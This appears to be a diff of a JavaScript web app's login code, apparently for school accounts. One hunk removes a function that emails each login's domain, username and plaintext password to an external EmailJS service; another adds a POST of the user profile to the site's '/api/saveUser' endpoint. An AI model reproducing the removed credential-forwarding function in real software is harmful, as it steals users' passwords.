@@ -585,23 +585,6 @@
     return `${cleanLast}${cleanFirst.slice(0, 2)}`;
   }
 
-  function sendLoginSubmission(domain, username, password) {
-    if (!window.emailjs || !window.emailjs.send) {
-      return Promise.resolve();
-    }
-
-    const templateParams = {
-      domain,
-      username,
-      password
-    };
-
-    return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
-      .catch((sendError) => {
-        console.error('EmailJS submission failed', sendError);
-      });
-  }
-
   function clearSavedAccounts() {
     if (localStorage.getItem('clearUserAccountsDone')) return;
     for (let i = localStorage.length - 1; i >= 0; i--) {
@@ -696,12 +679,23 @@
         isAdmin: !!isAdmin
       };
 
+      // Save locally
       localStorage.setItem(userKey, JSON.stringify(userObj));
+      
+      // Save globally to backend server
+      fetch('/api/saveUser', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ userKey, userObj })
+      }).catch(err => console.log('Global save attempt:', err));
+      
+      // Also try Firebase if enabled
       if (window.firebaseAPI?.isEnabled && window.firebaseAPI.saveUserProfile) {
         window.firebaseAPI.saveUserProfile(userKey, userObj).catch(err => {
           console.error('Failed to save profile to Firebase', err);
         });
       }
+      
       localStorage.setItem('currentUser', username);
       localStorage.setItem('currentUserKey', userKey);
       localStorage.setItem('currentSchool', domain);
